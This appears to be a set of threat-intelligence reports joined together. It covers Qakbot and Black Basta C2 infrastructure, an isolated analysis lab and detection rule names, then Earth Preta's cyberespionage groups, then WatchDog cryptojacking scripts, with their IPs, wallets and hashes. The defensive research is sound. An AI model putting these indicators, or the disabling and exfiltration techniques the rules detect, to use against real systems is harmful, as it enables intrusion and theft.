Thailand 0 2.89.78.130 993 Saudi Arabia 0 14.183.63.12 443 Viet Nam 0 27.73.215.46 32102 Viet Nam 0 31.166.116.171 443 Saudi Arabia 30 31.32.180.179 443 France 0 31.54.39.153 2078 United Kingdom 0 37.37.206.87 995 Kuwait 0 37.76.197.124 443 Palestine 0 41.103.226.172 443 Algeria 0 41.105.197.244 443 Algeria 0 41.107.78.223 995 Algeria 0 41.142.132.190 443 Morocco 0 41.69.103.179 995 Egypt 0 41.96.171.218 443 Algeria 0 45.160.124.211 995 Brazil 0 45.183.234.180 443 Brazil 0 45.241.140.181 995 Egypt 0 45.51.148.111 993 United States of America 0 46.116.229.16 443 Israel 0 46.186.216.41 32100 Kuwait 0 47.146.182.110 443 United States of America 0 61.105.45.244 443 Korea (Republic of) 0 61.70.29.53 443 Taiwan 0 62.114.193.186 995 Egypt 0 64.207.215.69 443 Afghanistan 0 66.181.164.43 443 Mongolia 0 68.129.232.158 443 United States of America 0 68.151.196.147 995 Canada 0 68.224.229.42 443 United States of America 0 68.50.190.55 443 United States of America 0 68.53.110.74 995 United States of America 0 70.49.33.200 2222 Canada 0 70.51.132.197 2222 Canada 0 70.81.121.237 2222 Canada 0 71.10.27.196 2222 United States of America 0 72.66.96.129 995 United States of America 0 72.88.245.71 443 United States of America 0 76.169.76.44 2222 United States of America 0 78.182.113.80 443 Turkey 0 81.214.220.237 443 Turkey 0 81.56.22.251 995 Italy 0 83.110.219.59 993 United Arab Emirates 0 84.238.253.171 443 Bulgaria 0 84.38.133.191 443 Netherlands 0 85.114.110.108 443 Palestine 0 85.139.203.42 32101 Portugal 0 85.98.206.165 995 Turkey 0 85.98.46.114 443 Turkey 0 87.220.229.164 2222 Spain 0 87.243.113.104 995 Bulgaria 0 87.75.195.211 443 United Kingdom 0 88.231.221.198 443 Turkey 0 88.231.221.198 995 Turkey 0 88.232.207.24 443 Turkey 0 88.242.228.16 53 Turkey 0 88.245.168.200 2222 Turkey 0 88.246.170.2 443 Turkey 0 88.251.38.53 443 Turkey 0 89.211.217.38 995 Qatar 0 89.211.223.138 2222 Qatar 0 91.116.160.252 443 Spain 0 94.99.110.157 995 Saudi Arabia 0 
95.136.41.50 443 Portugal 0 98.180.234.228 443 United States of America 0 99.232.140.205 2222 Canada 0 99.253.251.74 443 Canada 0 100.1.5.250 995 United States of America 0 102.101.231.141 443 Morocco 0 102.184.151.194 995 Egypt 0 102.38.97.229 995 South Africa 0 102.40.236.32 995 Egypt 0 105.105.104.0 443 Algeria 0 105.111.60.60 995 Algeria 0 105.99.80.23 443 Algeria 0 109.155.5.164 993 United Kingdom 0 109.200.165.82 443 Yemen 0 110.4.255.247 443 Japan 0 113.22.102.155 443 Viet Nam 0 118.174.200.169 995 Thailand 0 118.216.99.232 443 Korea (Republic of) 0 118.68.220.199 443 Viet Nam 0 119.42.124.18 443 Thailand 0 119.82.111.158 443 India 0 123.240.131.1 443 Taiwan 1 134.35.9.144 443 Yemen 0 138.0.114.166 443 Brazil 0 139.195.132.210 2222 Indonesia 0 139.195.63.45 2222 Indonesia 0 141.164.254.35 443 Saudi Arabia 0 151.234.63.48 990 Iran (Islamic Republic of) 0 154.181.203.230 995 Egypt 0 154.238.151.197 995 Egypt 0 154.246.182.210 443 Algeria 0 156.213.107.29 995 Egypt 0 156.219.49.22 995 Egypt 0 160.152.135.188 2222 Nigeria 0 160.176.204.241 443 Morocco 0 167.60.82.242 995 Uruguay 0 169.1.47.111 443 South Africa 0 171.238.230.59 443 Viet Nam 0 171.248.157.128 995 Viet Nam 0 173.218.180.91 443 United States of America 0 176.42.245.2 995 Turkey 0 177.255.14.99 995 Colombia 0 179.108.32.195 443 Brazil 0 179.223.89.154 995 Brazil 0 179.24.245.193 995 Uruguay 0 180.180.131.95 443 Thailand 0 181.111.20.201 443 Argentina 0 181.118.183.123 443 Argentina 0 181.127.138.30 443 Paraguay 0 181.231.229.133 443 Argentina 0 181.56.125.32 443 Colombia 0 181.80.133.202 443 Argentina 0 181.81.116.144 443 Argentina 0 182.213.208.5 443 Korea (Republic of) 0 184.82.110.50 995 Thailand 0 184.99.123.118 443 United States of America 0 186.105.182.127 443 Chile 0 186.120.58.88 443 Dominican Republic 0 186.154.92.181 443 Colombia 0 186.167.249.206 443 Venezuela (Bolivarian Republic of) 0 186.50.245.74 995 Uruguay 0 187.205.222.100 443 Mexico 0 188.157.6.170 443 Hungary 0 189.19.189.222 32101 Brazil 0 190.158.58.236 443 Colombia 0 190.44.40.48 995 Chile 0 190.59.247.136 995 Trinidad and Tobago 0 191.254.74.89 32101 Brazil 0 191.84.204.214 995 Argentina 0 191.97.234.238 995 Argentina 0 193.3.19.37 443 Russian Federation 0 194.166.205.204 995 Austria 0 194.49.79.231 443 United States of America 0 196.112.34.71 443 Morocco 0 196.92.172.24 8443 Morocco 0 197.11.128.156 443 Tunisia 0 197.204.243.167 443 Algeria 0 197.49.50.44 443 Egypt 0 197.94.84.128 443 South Africa 0 201.177.163.176 443 Argentina 0 210.195.18.76 2222 Malaysia 0 211.248.176.4 443 Korea (Republic of) 0 212.156.51.194 443 Turkey 0 219.69.103.199 443 Taiwan 0 220.116.250.45 443 Korea (Republic of) 0 ADDITIONAL IP'S OBSERVED IP Domain Country Abuseipdb Score 23.106.123.13 NA Singapore 0 23.106.160.141 danimos[.]com United States of America 0 23.19.58.43 zedorocop[.]com United Kingdom 0 23.29.115.172 NA United States of America 0 45.132.226.209 NA Switzerland 3 45.134.22.54 NA Italy 0 45.153.241.64 NA Germany 0 45.61.138.29 NA United Kingdom 0 45.86.200.21 NA Netherlands 0 45.86.200.77 NA Netherlands 0 45.89.242.2 NA United Kingdom 1 47.87.229.39 temp[.]sh United States of America 0 64.52.80.212 NA United States of America 0 78.141.213.249 NA Netherlands 0 104.194.10.130 NA United States of America 0 104.243.38.65 NA United States of America 0 138.199.59.52 NA Poland 0 146.70.106.61 NA Netherlands 0 146.70.86.44 gerhiles[.]com Netherlands 0 151.236.28.34 NA Netherlands 0 172.93.100.71 NA United States of America 0 176.10.80.37 NA United Kingdom 0 176.90.193.145 NA Turkey 0 185.163.110.124 NA Romania 0 185.77.218.10 NA Finland 0 194.37.97.161 NA United States of America 0 194.5.53.215 NA France 0 194.5.53.86 NA France 0 207.229.167.36 NA United States of America 100 212.30.37.227 NA Netherlands 0 INDEX B: MALWARE ANALYSIS LAB AND TOOL OVERVIEW 
The lab environment consisted of three Virtual Machines running inside of VMWare Workstation 16 Pro.
The network was configured not to allow any connection to the internet. 
HOST 1: ANALYSIS HOST 
The analysis host ran the Linux distro "REMnux."
Upon startup, an iptables setup script was ran containing all the hardcoded C2 IP’s for the Qakbot malware.
This was done in order to all the malware to communicate with the hard coded IP’s without allowing commination to a C2 host. 
Additional software used during the analysis includes: 
Wireshark:
Network packet capture and analysis Inetsim: An "Internet Simulation" tool which creates fake http and other services for malware samples to interact with. 
FakeDNS: A fake DNS service which responds with a predetermined IP.
Default IP is the host FakeDNS is installed on. 
Readpe.py: Used to read Portable Executable files. 
HOST 2: EXPERIMENTAL HOST 
The experimental host rans Windows 10 build 19041.
This host was used for detonation of the malware samples provided by the client. 
NXlog is installed on this host.
Windows logging is forwarded to Host 3. 
Host 1 is configured to be the internet gateway.
Aside from the logging connection to host 3, all other connections are forced through Host 1. 
X32dbg:
Interactive debugging program. 
Regshot: Captures a "snapshot" of the registry before and after detonation of a sample to observe the changes on the host. 
Network packet capture and analysis. 
Qakbot Registry Decryption Tool: Used to decrypt Qakbot registry entries. 
HOST 3: LOGGING HOST The logging host runs Debian 11.
This host only receives windows logging from Host 2. INDEX C: LIST OF SAGAN RULES DEVELOPED FROM THIS INCIDENT Rules that were developed following this incident.
A full list of Sagan Rules can be found on github.com/quadrantsec/sagan-rules Rule Name SID [CISCO-SECUREENDPOINT] Exploit attempt was detected 5008352 
[CISCO-SECUREENDPOINT] Exploit attempt was prevented 5008355 
[CISCO-SECUREENDPOINT] Event Engine Detection 5008356 
[WINDOWS-CLIPBOARD] Get-ADGroupMember Command 5008362 
[WINDOWS-CLIPBOARD] Get-ADUser Command 5008363 
[WINDOWS-CLIPBOARD] Service being stopped 5008364 
[WINDOWS-CLIPBOARD] Powershell Policy Bypass Command 5008365 
[WINDOWS-CLIPBOARD]
Disable Windows Defender Command 5008366 
Disable Realtime Monitoring Command 5008367 
[WINDOWS-CLIPBOARD] Uninstall Windows Defender Command 5008368 
[WINDOWS-CLIPBOARD] Remoe-exec psexec command 5008369 [WINDOWS-CLIPBOARD]
Powershell encodedcommand 5008370 [WINDOWS-CLIPBOARD] rundll32 command 5008371 
[WINDOWS-CLIPBOARD] rundll32 command with DllRegisterServer 5008372 
[WINDOWS-CLIPBOARD] net commands 5008373 [WINDOWS-CLIPBOARD] net commands 5008374 [WINDOWS-CLIPBOARD] query user command 5008375 
[WINDOWS-CLIPBOARD] rwinsta command 5008376 [WINDOWS-CLIPBOARD] nltest command 5008377 
[WINDOWS-CLIPBOARD] netstat output v1 5008378 [WINDOWS-CLIPBOARD] netstat output v2 5008379 
[WINDOWS-CLIPBOARD] copy from share drive to local C: command 5008380 
[WINDOWS-CLIPBOARD] bitsadmin file transfer command 5008381 
[WINDOWS-CLIPBOARD] proxychains command 5008382 
[WINDOWS-SECURITY] Service being stopped by net command v1 5008343 
[WINDOWS-SECURITY] Service being stopped by net command v2 5008344 
[WINDOWS-SECURITY]
Disable Windows Security 5008347 
[WINDOWS-SECURITY] Copied rundll32 command executing non-standard dll 5008348 
[WINDOWS-SECURITY] Possible UAC Bypass - Rundll32.exe using DLLRegister 5008351 
[WINDOWS-SECURITY] Exfil software rclone detected 5008354 [WINDOWS-SECURITY]
A service was installed in the system (powershell) 5008357 [WINDOWS-SECURITY]
A service was installed in the system (DllRegisterServer) 5008358 [WINDOWS-SECURITY]
A service was installed in the system (rundll32 .xls) 5008359 [WINDOWS-SECURITY]
A service was installed in the system (rundll32 public directory) 5008360 [WINDOWS-SECURITY]
Blackbasta ransomware file extension detected (.basta) 
5008361 [WINDOWS-SYSMON] CMD executed from spool directory 5008345 
[WINDOWS-SYSMON] Rundll32 network connection detected 5008346 
[WINDOWS-SYSMON]
Possible Traversal - File created in Public directory 5008349 
[WINDOWS-SYSMON] Possible hidden service installed 5008350 
[WINDOWS-SYSMON] Process Injection - Rundll32 remote thread into winlogon 5008353 [WINDOWS-SYSMON] Safeboot Registry Entry - Possible Blackbasta 5008399 INDEX D: REFERENCES -Deepinstinct’s review of similar Black Bast activityhttps://www.deepinstinct.com/blog/black-basta-ransomware-threat-emergence -Northwaves review of similar Black Basta activity to include the use of Qbot and Ransomware https://northwave-security.com/en/black-basta-blog/ -VirusTotal results for the file has of zfgufgfvezdnbcvjkzctpvfdj.dll, indicating Brute Ratel https://www.virustotal.com/gui/file/62cb24967c6ce18d35d2a23ebed4217889d796cf7799d9075c1aa7752b8d3967 -Brute Ratel and the use of PSEexc showing use of SMB for Remote Control:https://bruteratel.com/tabs/badger/commands/psexec/ -Brute Ratel and RPC Services:https://bruteratel.com/tabs/badger/commands/services/ -Recent warning regarding use of RCLONE by threat actors "Daixin Team" https://www.cisa.gov/uscert/ncas/alerts/aa22-294a -Qakbot Registry Decryption Tool https://github.com/drole/qakbot-registry-decrypt -Cybercheif recipe to extract and decode Shellcode from Bobal Strike Beacon https://gist.github.com/0xtornado/69d12572520122cb9bddc2d6793d97ab -Decoding of files similar to "w.bat" https://superuser.com/questions/1676713/how-to-decode-contents-of-a-batch-file-with-chinese-characters -Quadrant’s Github page for the Sagan Log Analysis Enginehttps://github.com/quadrantsec/sagan-rules For more information regarding this analysis interested parties should contact cclark@quadrantsec.com 
title: Earth Preta’s Cyberespionage Campaign Hits Over 200 url: https://www.trendmicro.com/en_us/research/23/c/earth-preta-cyberespionage-campaign-hits-over-200.html APT & Targeted Attacks Earth Preta’s Cyberespionage Campaign Hits Over 200 
We present a case study of the cyberespionage efforts by Earth Preta.
This study on an active campaign delves into the structure, goals, and requirements of the organizations involved, and provides an opportunity to conduct wider intelligence analysis and insights in the development of effective countermeasures. 
By: Trend Micro March 27, 2023Read time: ( words) Save to Folio Subscribe Since 2022, we’ve been following a series of cyberespionage efforts carried out by multiple groups carried from an old campaign.
It combines the collective activities carried out by subgroups of advanced persistent threat (APT) group Earth Preta (also known as Mustang Panda), representing a comprehensive network of operations for gathering sensitive information from various entities.
An analysis of their deployments also revealed a level of coordination and collaboration. 
Through extensive analysis and as of this writing, we discovered over 200 victims, leading to a wider intelligence analysis of the groups’ goals, different operation groups, and tactics, techniques, and procedures (TTPs).
Our study aimed at understanding the different phases and facets involved in this operation, shedding light on the motives and techniques used by Earth Preta to provide valuable insights and aid in the development of effective countermeasures. 
Key findings While not exhaustive of the entire study’s findings due to security and confidentiality concerns, we determined the following findings key to the entire research: 
A hierarchical structure. 
Earth Preta has a centralized development unit that produces the implants and tools, and disseminates them to other operational groups responsible for penetration and implantation.
This is evident in the Earth Preta group as it appears that multiple sub-operational groups use the same toolset with different techniques. 
A management of expertise.
The different operational groups manage their own methods of entry and privilege escalation, demonstrating a high degree of specialization within each group. 
A change in targets.
Towards the end of 2022, there were changes in how information was collected.
The latest active targets were related to maritime, shipping, border control, and immigration agencies.
Prior to this shift, most of the data collection efforts were aimed at academic institutions, ore and material refineries, specialized fabrication plants, financial institutions, and energy production and distribution. 
These key findings can help intelligence communities and decision-makers in understanding Earth Preta’s capabilities, objectives, and impact on international security and intellectual property.
With this entry, we hope to emphasize the importance of international cooperation in combating this significant threat. 
Method and findings We found that some operational part of the collective group were focused on stealing intellectual property and sensitive business information, while others targeted government and diplomatic entities.
We also found the operations having specific geographical regions for which they tailored their collection requirements. 
Figure 1.
Earth Preta’s top 10 targeted industries We used a qualitative approach to identify the collection requirements, methods, and objectives of the operational groups and their respective places in the organization.
We established links between the operational threat groups by grouping overlaps in victimology and identifying core indicators, such as implants or payloads. Figure 2.
Earth Preta’s targeted regions Case studies Overlaps Throughout our investigation, we observed several instances where victims were compromised by two groups simultaneously, indicating possible overlaps in collection requirements between these groups.
While there are no indications of overlaps in individual devices, there are strong indications of targets intersecting, suggesting these groups are pursuing similar objectives.
Additionally, the overlaps among victims indicate a lack in targeting coordination and/or planning within the overall groups' leadership or management. 
These targeting overlaps have been observed in multiple groups, such as Groups 724, 1358, and 5171.
Since these groups operate across a variety of sectors, it is likely that the overlap in collection requirements is the result of similar objectives rather than coordination between the toolset and collected materials.
However, we have not been able to identify any evidence of coordination between these groups or a shared toolset. 
Infection and exfiltration vectors Group 5171's exfiltration methods are sophisticated and designed to avoid detection.
Several victims in key countries, such as Singapore, Vietnam, Netherlands, Ghana, and Myanmar, have indications of files exfiltrated via a dedicated USB mass storage device.
For instance, in January 2023, a device from Vietnam loaded the Adobe CEF Helper under the path <C:\Users\XXX\AAM
UpdatesXXX\AAM Updates.exe>
and exfiltrated documents to drive F:.
The same device also carried out another collection in December 2022, where data was copied from folder <C\:$RECYCLE.BIN\S-XXXXX$XXXH.pdf>, indicating that the user deleted the collected data. 
Roaming endpoint attacks In contrast to Group 5171, Group 1358’s uses malicious USB mass storage devices as its primary method of compromise.
Our analysis indicated that toward the end of 2022 and early 2023, all documented intrusions from Group 1358 used USB mass storage devices.
In addition, there were multiple instances where initial compromise occurred while the assets of the target were roaming abroad through a technique known as the “traveling laptop attack.” 
Table 1.
Small sample of Earth Preta’s traveling laptop attack deployments and victims APT subgroups responsible for attack Victim organization’s industry, country Country where attack was deployed from Group 724 Maritime, Australia Papua New Guinea Group 1358 Construction, France Togo Group 5171 NGOs, Africa N/A This mix of traditional intelligence trade craft and cyber techniques could mean that these groups have access to advanced resources and support from nation states, since such techniques are not typically available to independent hackers.
Moreover, this approach could signify the growing convergence of cyber- and physical security as cyberattacks continue to move beyond digital systems and into the physical world. 
Operation groups While this is not a comprehensive list, we summarize and attribute the operational functions to specific groups as contributing units to Earth Preta’s cyberespionage activities and deployments.
As we continue following this campaign and track its activities, these group names will be updated accordingly once analyses and attribution are confirmed. 
Group 724 Group 724 is possibly related to Earth Preta.
The group utilizes sideloading with Adobe CEF Helper to establish a persistent foothold in the user's home directory, employing a naming convention with one of the following patterns: AcroRD32XXX AAM UpdatesXXX AcrobatXXX Eset Malware ProtectionXXX "XXX" denotes three random letters.
The group uses a USB drive as an entry point into a target's system, indicating its preference for leveraging physical vectors for intrusion.
This group is considered one of the most dangerous in the Southeast Asian region and has been known to target a myriad of organizations. 
Group 724 also appears to be focused on compromising targets in specific industries and countries.
The group has been observed targeting sectors such as finance, government, manufacturing, fabrication, construction, energy, transportation, air traffic, and food production.
This targeted approach indicates that the group has developed a clear understanding of the vulnerabilities and high-value assets present in these industries.
The significant level of proliferation suggests that it is well-funded and includes a large team of skilled individuals, likely enabling it to carry out attacks on multiple targets simultaneously. 
The group uses customized USB storage devices tailored to individual targets as part of their intrusion tactics.
These customized devices appear to be carefully crafted to bypass security measures and appear legitimate to the target.
With this preference for a physical entry vector, the group can increase the chances of a successful intrusion and maintain its covert operations.
This technique highlights the level of sophistication and planning that goes into Group 724's attacks. 
Group 1358 Group 1358 is a highly sophisticated threat actor that employs advanced tactics and techniques to infiltrate and compromise a wide range of targets worldwide.
The group has been observed utilizing Avast’s WSC DLL for sideloading, a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.
This group is potentially composed of several operating groups utilizing the same tools and techniques.
Persistence is established at ProgramData\AvastSvcXXX, where "XXX" represents three random letters.
The group uses generic USB mass storage devices as an entry point, suggesting that they prioritize ease of access over customization. 
This group’s choice of malware is PlugX, an older and well-known remote access tool.
Despite its age, PlugX remains an effective tool for threat actors due to its flexibility and evasion capabilities.
The group's victimology is extensive, targeting organizations across various sectors globally.
However, recent observations suggest that the group has shifted its collection efforts towards maritime-related information since December 2022.
Targets have included shipping information, sea vessel movements, border and immigration control, export-related government agencies, food production, and humanitarian groups.
While some of the targets are related to maritime research and development, most of the information we found as targeted pertain to operational maritime information, even to the extent of compromising specific vessels or tugboat companies. 
Exfiltration methods utilized involve the use of USB sticks that are plugged in, enabling the PlugX tool to copy all collected data into a previously known and expected USB stick.
This technique allows the group to remain undetected and avoid detection by traditional security measures. 
Group 5171 Group 5171 is a threat actor that utilizes advanced techniques to infiltrate and compromise targets across the Middle East and Europe.
The group uses DLL sideloading with Adobe CEF Helper and establishes persistence in the RECYCLERS.BIN folder.
In addition, the group also employs USB-based data exfiltration as part of their tactics. 
Group 5171 differentiates itself from other threat actors with their use of the travelling laptop attack.
This technique involves infecting a laptop with malicious code in transit.
Usually, the device will be travelling as part of a routine work travel and upon return to the origin country, a more elaborate exploitation and lateral movement can be initiated.
This method allows the group to bypass traditional security measures and gain access to their targets undetected. 
Sectoral targets of Group 5171 are spread out, indicating that the group does not focus on specific sectors but rather adopts a more opportunistic approach.
However, observing victims’ business verticals and sectors indicate that Group 5171’s collection efforts show a high level of interest in research and development related to IT solutions, materials manufacturing and fabrication, energy production and synthetization, air travel, and space. 
Conclusion We deem the findings of this research on Earth Preta’s cyberespionage operations have significant implications for international security and intellectual property.
There are strong indications of intertwined traditional intelligence tradecraft and cyber collection efforts, indicative of a highly coordinated and sophisticated cyberespionage operation.
We identified several distinct operational groups, each with unique TTPs and objectives, which reveals a highly specialized and organized cyberespionage operation. 
This study also suggests that Earth Preta’s cyberespionage operations have a broad reach and have the capacity to target high value targets.
The shift in collection priorities toward intelligence regarding specific areas also indicates that Earth Preta is targeting critical infrastructure and key institutions that can affect national and international relations, economies, and securities. 
Given the scale and sophistication of Earth Preta’s cyberespionage operations, the international community needs to take proactive measures to defend against this significant threat.
This includes robust cybersecurity measures, effective countermeasures against cyberespionage, and increased international cooperation in combating this threat.
The international community must raise awareness on the threats posed by Earth Preta’s cyberespionage operations, promote information sharing, and develop effective countermeasures.
It is essential to have a coordinated response to this threat, with the support of the private sector, academia, and civil society, to ensure the safety and security of critical infrastructure and intellectual property. 
Indicators of Compromise (IOCs) 
For a list of the IOCs, download the appendix here. 
Authors Trend Micro Research, News, and Perspectives 
title: Updated: New Evidence Emerges to Suggest WatchDog Was Behind Crypto Campaign url: https://unit42.paloaltonetworks.com/teamtnt-cryptojacking-watchdog-operations/ This post is also available in: 日本語 (Japanese)Author's Note New evidence has emerged that suggests the group WatchDog was behind a cryptojacking campaign that we attributed to TeamTNT in a blog published on June 8, 2021.
This updated information changed our view on the evidence initially gathered by Unit 42 researchers. 
Specifically, the domain oracle.zzhreceive[.]top was originally linked to TeamTNT operations due to the usage of the term zzhreceive, which has been witnessed within several TeamTNT operations.
Given recent developments and the growing analytic visibility within the cloud research community, this domain has now been attributed to the cryptojacking operations associated with the group WatchDog. 
The following is an update of our original blog, more accurately aligned to the current intelligence community information regarding WatchDog’s mimicry of TeamTNT operations. 
Executive Summary The copying and incorporation of cryptomining operational codebase or script functions have become a central behavioral indicator of cryptojacking groups and their operations.
Unit 42 researchers have identified tactics, techniques and procedures (TTPs) used by the TeamTNT cryptojacking group being used by the WatchDog cryptojacking group.
The new scripts from WatchDog are overtly copying TeamTNT infrastructure naming conventions and using a known WatchDog C2 hosting system, 199.199.226[.]117. 
With the identification of these new WatchDog scripts, Unit 42 researchers found that techniques that have been synonymous with the TeamTNT group have gone missing.
For instance, the new scripts do not: Researchers have also observed that the new WatchDog scripts do not use the exploit-laden GoLang binaries traditionally associated with WatchDog. 
While WatchDog is believed to be the author of these new scripts, several of the scripts were found within TeamTNT-owned public malware repositories.
It appears that WatchDog may be attempting to expand their cryptojacking operations, while simultaneously masking their operations to appear more like the known cryptojacking operations performed by TeamTNT. 
The stealing, hijacking or incorporation of cryptojacking TTPs within other cryptojacking operations has become a common trend within cryptojacking groups.
Most notably, TeamTNT was reported to have copied the code used to detect and remove Alibaba Cloud Security from compromised instances from the Kinsing group.
Also, cryptojacking groups such as “Rocke” began as a forked GitHub repository from the cryptojacking operation created by “The 8220 Mining Group.”
This operation shares up to 30% of its cryptomining code base with tools developed by the group “Pacha.”
Pacha and Rocke were subsequently involved in a documented crypto war, which has lasted nearly two years.
While little research has been written on recent Pacha operations, Rocke is still developing new malware. 
Palo Alto Networks customers running Prisma Cloud are protected from the threats presented in this report through the Runtime Protection feature, Cryptominer Detection feature and the Prisma Cloud Compute Kubernetes Compliance Protection, which alerts on an insufficient Kubernetes configuration and provides secure alternatives.
Additionally, Palo Alto Networks VM-Series and CN-Series products offer cloud protections that can prevent network connections from cloud instances toward known malicious IP addresses and URLs. 
New WatchDog Malware There are two samples that show the evolution of WatchDog techniques to mimic TeamTNT operations, 36ca9f84864ad022c255b7d91e75997f035716e4df5dc1c90ee2651f092f5d79 and 49366ae4766492d94136ca1f715a37554aa6243686c66bf3c6fbb9da9cb2793d.
These samples, first witnessed on Dec. 5 and 11, 2020, respectively, show the direct replacement of the known WatchDog C2 infrastructure with new C2 infrastructure.
As shown in Figure 1, the original WatchDog infrastructure, in the dark blue rectangle, has been commented out of the bash script functionality and replaced with the new infrastructure seen in the light blue rectangle. 
Figure 1.
WatchDog infrastructure replacement.
The new script also makes use of the exact URL address directory tree pattern that is present within the known WatchDog operations, with the directories b2f628 (red) and b2f628fff19fda999999999 (orange), as shown in Figure 2. Figure 2. URL directory pattern.
These two samples contain a hardcoded Monero (XMR) wallet address and an associated mining pool, as shown in Figure 3. Figure 3.
Monero wallet and associated mining pool.
Mining Pools If these changes are indeed new TeamTNT behaviors, which is highly unlikely, it would represent the first time the TeamTNT cryptojacking operations have used a mining pool outside their traditional Monero mining pool, MoneroOcean[.]stream.
This cryptojacking operation introduces two new mining pools never before known to be used by TeamTNT actors, but have been witnessed within WatchDog operations.
These mining pools are nanopool[.]org, shown in Figure 4, and f2pool[.]com, shown in Figure 5.
The new mining pools are both instructed to use the Monero wallet address, 43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz. 
Figure 4.
Nanopool mining operation. 
Figure 5.
F2pool mining operation.
Mining Pool Worker Information Of note are the names of the mining pool workers associated with this Monero wallet address within the mining pools.
According to nanopool[.]org records related to this Monero wallet address, there are a total of 20 unique workers, as shown in Figure 6. Figure 6.
Nanopool mining operation workers.
The following table, Table 1, lists 19 of the currently known malicious samples which contain the Monero wallet address, the Nanopool mining pool and the name of one of the workers listed within Figure 6. SHA256 Worker 0414946ab4bced2c1c41f4b8a75be672b34bbdee6f29e0a0bf7946b93f7044b1 3910 34b547b567309618422d7075322ddf5b9e0b3a4fb652f3845d12fd649f23923e 3910 62957aa4421c044927269e9bf3300515cf01225fd4c3c3811f8ebfac7a9f8585 3910 f235c021baa6c8801e724d45003b1b1541eea5483810abc9c3eb4df6bf05afbf 3910 2bc6c21d35ed63b135b4723444a9ac532e4cb6aaa2bbd63c557136edb4e4756f crondk1 cbf54a9e5771fcb3760e4e282f003a879164e76b9df9fed0fe4e4e8aaaef11ae crondk1 428633aee75f7c69a7c0612e591d5fcecbcf13619d6c05b86c8303a248c7c8d7 dk2 7b6f7c48256a8df2041e8726c3490ccb6987e1a76fee947e148ea68eee036889 dk2 10fb8d16f7d168340be28c6d0ba94e10c15370c8747d97bc0e5fad4b4466cf09 dream 3b280a4017ef2c2aef4b3ed8bb47516b816166998462899935afb39b533890ad dream 8adc8be4b7fa2f536f4479fa770bf4024b26b6838f5e798c702e4a7a9c1a48c6 dream af611a41c55e9afcfaced8b067a470caa70825fce0a44167f44a8d3880ae6674 dream e1d7014b84618cd7fbf94439c78fe7d67f351cbc5536885fa3d94ea15325d83b dream eca42c42f0909cf4e6df6bf8de35ab93ef6a3dd10d0d5e556721ec1871a9990c dream ae6822d1fd097e8c52cea3731cd49f50600b7da83e9f0ea6dbc689685f907739 dream3 3b280a4017ef2c2aef4b3ed8bb47516b816166998462899935afb39b533890ad dream5 ae3e4a1c8a2b661265e6c8c756e3ba472dc7177cae79fe1861ab0c2d1af5167a dream6 8adc8be4b7fa2f536f4479fa770bf4024b26b6838f5e798c702e4a7a9c1a48c6 dream8 33da23085fb6fd7aad89e0c55b7ccbc2ee50fec4e8e31030e4b2a4ef034ac5f6 pokemon2 Table 1.
Malware samples with hardcoded Nanopool mining operation workers. 
There were also 13 malicious samples containing the 43Xb Monero wallet address, but these samples are designed to use the f2pool[.]com mining pool instead of the nanopool[.]org Monero mining pool (see Table 2). 
SHA256 Worker WatchDog Wallet f235c021baa6c8801e724d45003b1b1541eea5483810abc9c3eb4df6bf05afbf 3910 3d8a6f5d8162e8eb78e7b95384ec6418f65b904dffa8fd983a6a19a5645ad707 clean c141eaeab461a2481124a73ee2d254301573d8722dbf3221f5fc54d7770e67a2 clean Yes 64072e7c56895f59124c4e26e0dd65a4de0bd8280c83372c18f9835978cda0e9 clean 30f0207b74d6d2d17cd8f4dc9f9131bd8763702f19c87ce74ea13a634f52c995 clean Yes 7a8c91f4228be4d36e1087acc9bb046373ddfde506fe4645ad1b0967c08bfa8b clean Yes 7848fc64c9977796dcc0ee67c293f006d715d3b3e257a3c0f4654cefab637c45 clean Yes 3e6cf5ae8ce6ff7305da4e218a20ec7f57933235ec07d7ff6e6a18c7c844ff29 clean Yes 8d9bdcae4a4559e52b3d03209a1ef880e948d9f3969f7779119d9322c5f7cf7c clean Yes ab73aedbee66081cd047b19a4bb036f85791a9ae9abc90545c5d8756bbc2a428 clean Yes eca42c42f0909cf4e6df6bf8de35ab93ef6a3dd10d0d5e556721ec1871a9990c dream e47802d7f44fc9e594b89ef33298367d21695d5ec1ae5e6c526b9f3124c555ca Undefined cf890e288f4fb7a2cfb0aa7e91229cc51c224e767c6ca69bbbb9d06e999ede64 Undefined Table 2.
Malware samples with hardcoded f2pool mining pool operation workers. 
Seven samples within the previous table contain instructions to find and remove any processes using the WatchDog-identified 43XB Monero wallet address, as shown in Figure 7. Figure 7.
Identification and killing of processes using the WatchDog Monero address.
The scripts will then rebuild mining operations and begin using two known WatchDog Monero wallet addresses, 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4 and 87q6aU1M9xmQ5p3wh8Jzst5mcFfDzKEuuDjV6u7Q7UDnAXJR7FLeQH2UYFzhQatde2WHuZ9LbxRsf3PGA8gpnGXL3G7iWMv.
These two Monero wallets are just two of the three known Monero wallets that are associated with the WatchDog cryptojacking group.
Of note, the IP address listed within Figure 8, 139.99.102[.]72, resolves to the previously mentioned xmr-asia1.nanopool[.]org mining pool. 
Figure 8.
WatchDog Monero wallet addresses.
Linking WatchDog Infrastructure to TeamTNT The URL addresses and Monero wallet address, 87A5fSCR98nFSR9NCRxt6UFytca3hJXaRdDgf9NxhWTjT3q3AA8HECyZ1FdF93D5LPXsSqS8dKNsxCxafrbuVeZfMW3V7ib, specifically called out within the sample 36bf7b2ab7968880ccc696927c03167b6056e73043fd97a33d2468383a5bafce (see Figure 9), are known WatchDog indicators.
However, the sample also includes the email address hilde@teamtnt[.]red, which is a known TeamTNT email address. Figure 9.
Known WatchDog indicators of compromise (IoCs), as well as the TeamTNT email address.
Now to the malware sample, 8adc8be4b7fa2f536f4479fa770bf4024b26b6838f5e798c702e4a7a9c1a48c6, which contains the new WatchDog Monero wallet, as shown in Figure 10.
The same MOxmrigMOD URL address as the known TeamTNT IoC shown within Figure 9 is present, but in this sample we also see additional URL addresses that have very strong ties to WatchDog infrastructure, specifically those involving the domain name oracle.zzhreceive[.]top. 
Figure 10.
New IoCs analyzed in surrounding text.
With the presence of the C2 infrastructure from these new scripts, Figure 9 and Figure 10, both of which use the WatchDog directory, b2f628, there is a clear link to the TeamTNT infrastructure.
